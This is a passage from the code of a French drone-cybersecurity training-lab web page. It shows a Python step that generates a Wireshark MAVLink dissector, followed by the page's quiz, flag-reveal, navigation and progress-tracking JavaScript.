      cmd:'import os\nfrom pymavlink.dialects.v20 import ardupilotmega as mav\n\nq = chr(34)\nn = chr(10)\n\nentries = sorted((v.id, v.name) for v in mav.mavlink_map.values())\ntbl = n.join("  [" + str(i) + "]=" + q + nm + q + "," for i, nm in entries)\n\nbody = n.join([\n    "-- mavlink.lua (auto-generated: " + str(len(entries)) + " messages)",\n    "local p=Proto(" + q+"mavlink2"+q+","+q+"MAVLink"+q+")",\n    "p.fields={}",\n    "local MSG={", tbl, "}",\n    "function p.dissector(buf,pinfo,tree)",\n    "  if buf:len()<8 then return end",\n    "  local stx=buf(0,1):uint()",\n    "  local plen,id,sys,sq,co",\n    "  if stx==0xFE then",\n    "    plen=buf(1,1):uint();sq=buf(2,1):uint();sys=buf(3,1):uint()",\n    "    id=buf(5,1):uint();co=6+plen",\n    "  elseif stx==0xFD then",\n    "    plen=buf(1,1):uint();sq=buf(4,1):uint();sys=buf(5,1):uint()",\n    "    id=buf(7,1):uint()+buf(8,1):uint()*256+buf(9,1):uint()*65536;co=10+plen",\n    "  else return end",\n    "  if buf:len()<co+2 then return end",\n    "  local name=MSG[id] or ("+q+"ID_"+q+"..id)",\n    "  pinfo.cols.protocol="+q+"MAVLink"+q,\n    "  pinfo.cols.info=name.."+q+"  sys="+q+"..sys.."+q+"  seq="+q+"..sq",\n    "  tree:add(p,buf(),"+q+"MAVLink "+q+"..name)",\n    "end",\n    "DissectorTable.get("+q+"udp.port"+q+"):add(14550,p)",\n    "DissectorTable.get("+q+"udp.port"+q+"):add(14551,p)",\n    ""\n])\n\nout = os.path.expanduser("~/.local/lib/wireshark/plugins/mavlink.lua")\nos.makedirs(os.path.dirname(out), exist_ok=True)\nopen(out, "w").write(body)\nprint("Done -", len(entries), "messages ->", out)',
      exp:{fr:"Cliquez <strong>Copier</strong>, puis : <code>nano ~/gen_mavlink.py</code>, collez (<kbd>Ctrl+Shift+V</kbd>), <kbd>Ctrl+O</kbd> → Entrée → <kbd>Ctrl+X</kbd>."}},
    {t:"cmd", step:"5.5", name:{fr:"Générer le dissector"},
      cmd:"python3 ~/gen_mavlink.py",

  function questionCard(m,q,i){
    var done = isDone(m.id) || !!solvedSet(m.id)[i];
    var hinted = !done && ((wrong[m.id]||{})[i]||0) > 0; // déjà révélé via hint
    var flagCls = done ? ' show' : (hinted ? ' hinted' : '');
    return '<div class="qa'+(done?' solved':'')+'" id="qa-'+m.id+'-'+i+'">'+
      '<div class="qa-q"><span class="qa-n">Q'+(i+1)+'</span><span>'+L(q.q)+'</span></div>'+
      (q.hint?'<div class="qa-hint">💡 '+L(q.hint)+'</div>':'')+
      '<div class="qa-row">'+
        '<input class="qa-input" id="qaInput-'+m.id+'-'+i+'" autocomplete="off" spellcheck="false" placeholder="'+L(UI.answerPh)+'" '+(done?'disabled':'')+
          ' onkeydown="if(event.key===\'Enter\'){App.checkAnswer(\''+m.id+'\','+i+')}">'+
        '<button class="btn btn-primary" onclick="App.checkAnswer(\''+m.id+'\','+i+')">'+ICON.check+L(UI.check)+'</button>'+
      '</div>'+
      '<div class="qa-msg" id="qaMsg-'+m.id+'-'+i+'"></div>'+
      // Flag — toujours visible, masqué par défaut
      '<div class="qa-flag'+flagCls+'" id="qaFlag-'+m.id+'-'+i+'">'+
        '<span class="qf-ico">'+ICON.flag+'</span>'+
        '<span class="qf-label">'+L(UI.flagWord)+'</span>'+
        '<span class="qf-masked">•••••••</span>'+
        '<span class="qf-code">'+esc(q.flag)+'</span>'+
        '<button class="copy-btn" style="'+(done?'':'display:none')+'" id="qaFlagCopy-'+m.id+'-'+i+'" data-copy="'+encodeURIComponent(q.flag)+'">'+ICON.copy+L(UI.copy)+'</button>'+
      '</div>'+
      // Bouton hint — visible sur toutes les questions non résolues
      (done?'':'<button class="qa-hint-btn'+(hinted?' open':'')+'" id="qaHint-'+m.id+'-'+i+'" onclick="App.revealFlag(\''+m.id+'\','+i+')">'+
        ICON.flag+L(UI.showFlag)+'</button>')+
    '</div>';
  }

  function revealFlag(mid,i){
    var flag=document.getElementById("qaFlag-"+mid+"-"+i);
    var hint=document.getElementById("qaHint-"+mid+"-"+i);
    var copy=document.getElementById("qaFlagCopy-"+mid+"-"+i);
    if(!flag) return;
    var isOpen = flag.classList.contains("hinted");
    if(isOpen){
      flag.classList.remove("hinted");
      if(hint) hint.classList.remove("open");
    } else {
      flag.classList.add("hinted");
      if(hint) hint.classList.add("open");
      if(copy) copy.style.display="";
    }
  }
  function toggleAnswer(mid,i){ revealFlag(mid,i); } // alias de compatibilité

  function renderValidation(m){
    var got = m.validation.reduce(function(n,q,i){return n+((isDone(m.id)||solvedSet(m.id)[i])?1:0)},0);
    var cards = m.validation.map(function(q,i){return questionCard(m,q,i)}).join("");
    return '<div class="val-wrap"><div class="val-console">'+
      '<div class="val-head"><div class="vh-ico">'+ICON.flag+'</div><div><div class="t">'+L(UI.valTitle)+'</div><div class="s">'+L(UI.valSub)+'</div></div></div>'+
      '<div class="val-body">'+
        '<p class="prose" style="margin-top:8px">'+L(UI.valIntro)+'</p>'+
        '<p class="val-progress" id="valProg-'+m.id+'">'+L(UI.valCount)+': <b>'+got+' / '+m.validation.length+'</b></p>'+
        cards+
        '<div class="val-done'+(isDone(m.id)?' show':'')+'" id="valDone-'+m.id+'">'+valDoneInner(m)+'</div>'+
      '</div></div></div>';
  }

  function valDoneInner(m){
    var i=moduleIndex(m.id), last=i===COURSE.length-1;
    if(last) return '<div class="vd-banner">'+ICON.checkCircle+L(UI.finishTitle)+'</div><p class="prose" style="margin:0">'+L(UI.finishMsg)+'</p>';
    var next=COURSE[i+1];
    return '<div class="vd-banner">'+ICON.checkCircle+L(UI.moduleValidated)+'</div>'+
      '<button class="btn btn-primary" onclick="App.go(\''+next.id+'\')">'+L(UI.nextModule)+': '+L(next.navName)+' '+ICON.arrow+'</button>';
  }

  function checkAnswer(mid,i){
    var m=COURSE[moduleIndex(mid)], q=m.validation[i];
    var inp=document.getElementById("qaInput-"+mid+"-"+i);
    var msg=document.getElementById("qaMsg-"+mid+"-"+i);
    var val=norm(inp.value);
    var ok=q.accept.some(function(a){return norm(a)===val});
    if(ok){
      solvedSet(mid)[i]=true; inp.disabled=true;
      document.getElementById("qa-"+mid+"-"+i).classList.add("solved");
      // Passer le flag de hinted/masked → show (plein style succès)
      var flagEl=document.getElementById("qaFlag-"+mid+"-"+i);
      if(flagEl){ flagEl.classList.remove("hinted"); flagEl.classList.add("show"); }
      // Afficher le bouton copier du flag
      var copyBtn=document.getElementById("qaFlagCopy-"+mid+"-"+i);
      if(copyBtn) copyBtn.style.display="";
      // Supprimer le bouton hint (question résolue)
      var hint=document.getElementById("qaHint-"+mid+"-"+i);
      if(hint) hint.remove();
      msg.className="qa-msg"; msg.innerHTML="";
      var got=m.validation.reduce(function(n,qq,j){return n+(solvedSet(mid)[j]?1:0)},0);
      var prog=document.getElementById("valProg-"+mid);
      if(prog) prog.innerHTML=L(UI.valCount)+": <b>"+got+" / "+m.validation.length+"</b>";
      setupCopy();
      updateProgress();
      if(allSolved(m)){
        if(!isDone(mid)){state.done.push(mid);} // pas de persistance localStorage
        var dn=document.getElementById("valDone-"+mid);
        dn.innerHTML=valDoneInner(m); dn.classList.add("show");
        buildNav(); updateProgress(); setupCopy();
      }
    }else{
      if(!wrong[mid]) wrong[mid]={};
      wrong[mid][i]=(wrong[mid][i]||0)+1;
      inp.classList.add("bad"); msg.className="qa-msg err show"; msg.innerHTML=L(UI.bad);
      setTimeout(function(){inp.classList.remove("bad")},400);
    }
  }

  /* ===================== SECTION ===================== */
  function trackBanner(){
    var win=state.os==="windows";
    return '<div class="track-banner '+(win?'win':'ubuntu')+'">'+(win?ICON.windows:ICON.linux)+
      '<div><b>'+L(win?UI.winTrack:UI.ubuntuTrack)+'</b> — '+L(win?UI.winDesc:UI.ubuntuDesc)+'</div>'+
      '<button class="tb-switch" onclick="App.setOS(\''+(win?'linux':'windows')+'\')">'+L(UI.switchTo)+' '+(win?'Ubuntu':'Windows')+'</button></div>';
  }

  function renderSection(m){
    if(!isUnlocked(m.id)) return renderLocked(m);
    var head='<div class="sec-head"><div class="sec-eyebrow">'+L(m.eyebrow)+'</div><h2 class="sec-title">'+L(m.heading)+'</h2></div>';
    var intro = m.intro ? '<div class="content" style="padding-bottom:0"><p class="prose sec-intro">'+L(m.intro)+'</p>'+(m.goals?'<ul class="goals-list">'+m.goals.map(function(g){return '<li>'+L(g)+'</li>';}).join('')+'</ul>':'')+'</div>' : '';
    var bar='<div class="module-card"><div class="mod-bar">'+
      '<div class="mb-obj"><span class="mb-label">'+L(UI.objective)+'</span><span class="mb-text">'+L(m.objective)+'</span></div>'+
      '<div class="mb-dur"><span class="mb-label">'+L(UI.duration)+'</span><span class="mb-val">'+L(m.duration)+'</span></div>'+
      '</div></div>';
    var banner = '';
    var body='<div class="content">'+m.blocks.map(renderBlock).join("")+'</div>';
    return '<div class="section active" id="sec-'+m.id+'">'+head+intro+bar+banner+body+renderExercise(m)+renderValidation(m)+'</div>';
  }

  function renderLocked(m){
    var i=moduleIndex(m.id);
    var isFirst=(i===0);
    var prev=!isFirst ? COURSE[i-1] : null;
    var msg = isFirst
      ? L({fr:"Choisissez votre système ci-dessus et cliquez sur <strong>Démarrer le lab</strong> pour commencer."})
      : L(UI.lockedMsg);
    return '<div class="section active" id="sec-'+m.id+'"><div class="locked-screen">'+
      '<div class="lk-ico">'+ICON.lock+'</div><h2>'+L(UI.lockedTitle)+'</h2><p>'+msg+'</p>'+
      (prev?'<button class="btn btn-ghost" onclick="App.go(\''+prev.id+'\')">'+L(UI.goPrev)+' '+ICON.arrow+'</button>':'')+'</div></div>';
  }

  function renderHero(){
    var win=state.os==="windows";
    return '<section class="hero"><div class="hero-grid"></div><div class="hero-inner">'+
      '<div class="hero-org">IMT ATLANTIQUE · CYBERSÉCURITÉ DRONES</div>'+
      '<h1>Sécurité des<span class="em">environnements UAV &amp; USV</span></h1>'+
      '<p class="hero-sub">Une formation pas à pas : comprendre MAVLink, mener des attaques en simulation, puis prévenir et détecter le spoofing GPS.</p>'+
      '<div class="tp-fixed">'+ICON.linux+'<span>Formation Linux / Ubuntu</span></div>'+
      '</div></section>';
  }

  /* ===================== NAV + PROGRESS ===================== */
  function buildNav(){
    var nav=document.getElementById("sideNav"); nav.innerHTML="";
    COURSE.forEach(function(m){
      var g=document.createElement("div"); g.className="nav-group"; g.dataset.id=m.id;
      var done=isDone(m.id);
      var b=document.createElement("button");
      b.className="nav-link"+(done?" done":"")+(m.id===state.current?" active":"");
      b.innerHTML='<span class="nl-num">'+m.num+'</span><span class="nl-txt">'+L(m.navName)+'</span><span class="nl-state">'+(done?ICON.check:ICON.dot)+'</span>';
      b.onclick=function(){go(m.id)};
      g.appendChild(b);
      if(m.subs && m.subs.length){
        var sub=document.createElement("div"); sub.className="nav-sub";
        m.subs.filter(function(s){return !s.os||s.os===state.os}).forEach(function(s){
          var sb=document.createElement("button"); sb.className="nav-sublink"; sb.textContent=L(s.t);
          sb.onclick=function(e){e.stopPropagation(); go(m.id, s.a);};
          sub.appendChild(sb);
        });
        g.appendChild(sub);
      }
      nav.appendChild(g);
    });
    navState(state.current);
  }
  function navState(id){ document.querySelectorAll(".nav-group").forEach(function(g){g.classList.toggle("open", g.dataset.id===id)}); }

  function updateProgress(){
    var total=COURSE.length, done=state.done.length, pct=Math.round(done/total*100);
    var ring=document.getElementById("ringFill"), circ=2*Math.PI*14;
    ring.setAttribute("stroke-dasharray", circ.toFixed(1));
    ring.setAttribute("stroke-dashoffset", (circ*(1-done/total)).toFixed(1));
    document.getElementById("ringPct").textContent=pct+"%";
    document.getElementById("pmetaCount").textContent=done+" / "+total;
    // mise à jour du score
    var sd=document.getElementById("scoreDisplay");
    if(sd){ var ts=totalScore(),ms=maxScore(); sd.textContent=ts+" / "+ms; }
  }

  /* ===================== NAVIGATION ===================== */
  function go(id, anchorId){
    state.current=id;
    var m=COURSE[moduleIndex(id)];
    var main=document.getElementById("main");
    main.innerHTML = (id===COURSE[0].id ? renderHero() : "") + renderSection(m);
    document.querySelectorAll(".nav-link").forEach(function(l){l.classList.remove("active")});
    var grp=document.querySelector('.nav-group[data-id="'+id+'"]');
    if(grp){grp.querySelector(".nav-link").classList.add("active");}
    navState(id); closeSidebar(); setupCopy();
    setTimeout(function(){ if(anchorId){anchor(anchorId);return;} window.scrollTo({top:0,behavior:"smooth"}); },40);
  }
  function anchor(a){ var el=document.getElementById("anchor-"+a); if(el){ var y=el.getBoundingClientRect().top+window.scrollY-76; window.scrollTo({top:y,behavior:"smooth"}); } }

  /* ===================== COPY ===================== */
  function flash(btn){ var o=btn.innerHTML; btn.classList.add("ok"); btn.innerHTML=ICON.check+L(UI.copied); setTimeout(function(){btn.classList.remove("ok"); btn.innerHTML=o;},1400); }
  function doCopy(text,btn){ if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(function(){flash(btn)},function(){fb(text,btn)});}else fb(text,btn); }
  function fb(text,btn){ var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";document.body.appendChild(ta);ta.select();try{document.execCommand("copy");flash(btn)}catch(e){}document.body.removeChild(ta); }
  function setupCopy(){ document.querySelectorAll("[data-copy]").forEach(function(btn){ if(btn._wired)return; btn._wired=true; btn.addEventListener("click",function(){doCopy(decodeURIComponent(btn.getAttribute("data-copy")),btn)}); }); }

  /* ===================== THEME / OS / LANG ===================== */
  function applyTheme(t){ state.theme=t; document.body.setAttribute("data-theme",t); document.getElementById("themeBtn").innerHTML=t==="light"?ICON.moon:ICON.sun; set("lab_theme",t); }
  function setOS(os){
    state.os=os; document.body.setAttribute("data-os",os);
    var elL=document.getElementById("osLinux");
    var elW=document.getElementById("osWindows");
    if(elL) elL.classList.toggle("active",os==="linux");
    if(elW) elW.classList.toggle("active",os==="windows");
    buildNav(); go(state.current);
  }
  function setLang(lang){
    state.lang=lang; set("lab_lang",lang); document.documentElement.lang=lang;
    document.getElementById("langFr").classList.toggle("active",lang==="fr");
    document.getElementById("langEn").classList.toggle("active",lang==="en");
    applyStaticText(); buildNav(); go(state.current);
  }
  function applyStaticText(){
    var pm=document.getElementById("pmetaLabel"); if(pm) pm.textContent="Progression";
    var lo=document.getElementById("lblOs"); if(lo) lo.textContent="Système";
    var se=document.getElementById("sideEyebrow"); if(se) se.textContent="Parcours";
    var sf=document.getElementById("sideFoot"); if(sf) sf.innerHTML=L(UI.foot);
    var sl=document.getElementById("scoreLbl"); if(sl) sl.textContent="Score";
  }

  function openSidebar(){document.getElementById("sidebar").classList.add("open");document.getElementById("backdrop").classList.add("show");}
  function closeSidebar(){document.getElementById("sidebar").classList.remove("open");document.getElementById("backdrop").classList.remove("show");}

  function init(){
    try{ localStorage.removeItem("lab_done"); }catch(e){}  // reset progression à chaque chargement
    applyTheme(state.theme);
    document.documentElement.lang="fr";
    setOS(state.os);
    applyStaticText(); updateProgress();
    document.getElementById("themeBtn").addEventListener("click",function(){applyTheme(state.theme==="light"?"dark":"light")});
    document.getElementById("menuBtn").addEventListener("click",openSidebar);
    var stb=document.getElementById("scrollTop");
    stb.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
    window.addEventListener("scroll",function(){stb.classList.toggle("show",window.scrollY>420)},{passive:true});
  }

  return { init:init, go:go, anchor:anchor, setOS:setOS, checkAnswer:checkAnswer, closeSidebar:closeSidebar, revealFlag:revealFlag, toggleAnswer:toggleAnswer, _state:state };
})();

document.addEventListener("DOMContentLoaded", function(){ App.init(); });

</script>
</body>
</html>
